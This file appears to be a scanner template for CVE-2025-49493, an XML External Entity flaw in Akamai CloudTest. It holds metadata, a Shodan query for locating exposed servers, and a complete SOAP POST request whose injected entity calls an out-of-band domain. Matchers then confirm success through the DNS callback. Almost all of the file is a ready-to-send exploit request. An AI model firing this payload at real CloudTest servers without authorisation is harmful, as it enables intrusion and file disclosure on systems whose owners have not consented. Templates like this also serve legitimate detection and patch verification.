cves/2025/CVE-2025-49493.poc

## id: CVE-2025-49493
## name: Akamai CloudTest < 60 2025.06.02 - XML External Entity (XXE)
## author: hack007x
## severity: critical
## cve: CVE-2025-49493
## tags: cve,cve2025,akamai,cloudtest,xxe,oast,rce,vkev,vuln,oob
## description: Akamai CloudTest before 60 2025.06.02 (12988) allows file inclusion via XML External Entity (XXE) injection.
## affects: Upgrade Akamai CloudTest to version 60 2025.06.02 (12988) or later that properly disables external entity processing.
## cvss-score: 9.1
## reference: https://xbow.com/blog/xbow-akamai-cloudtest-xxe/
## reference: https://techdocs.akamai.com/cloudtest/changelog/june-2-2025-enhancements-and-bug-fixes
## reference: https://nvd.nist.gov/vuln/detail/CVE-2025-49493
## shodan-query: html:"Akamai CloudTest"
## verification: true

POST /concerto/services/RepositoryService HTTP/1.1
Host: {{Hostname}}
User-Agent: {{random_ua}}
Content-Type: text/html
SOAPAction: ""

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE soapenv:Envelope [
  <!ENTITY xxe SYSTEM "http://{{oob_domain}}">
]>
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"
                  xmlns:rep="http://example.com/services/repository">
   <soapenv:Header/>
   <soapenv:Body>
      <rep:getUIBundleObjectXml>
         <rep:uiBundleRequestXml>&xxe;</rep:uiBundleRequestXml>
      </rep:getUIBundleObjectXml>
   </soapenv:Body>
</soapenv:Envelope>

#@ oob: dns
#@ condition: and
#@ matcher: oob_received == true
#@ matcher: header["content-type"] contains "text/xml"
#@ matcher: body contains "XML stream"





# @VEIL-STAMP: 930402e91d435a1a5c971149cf066b0f2d2afb3ea5f0d25a695d1471f470c1ef
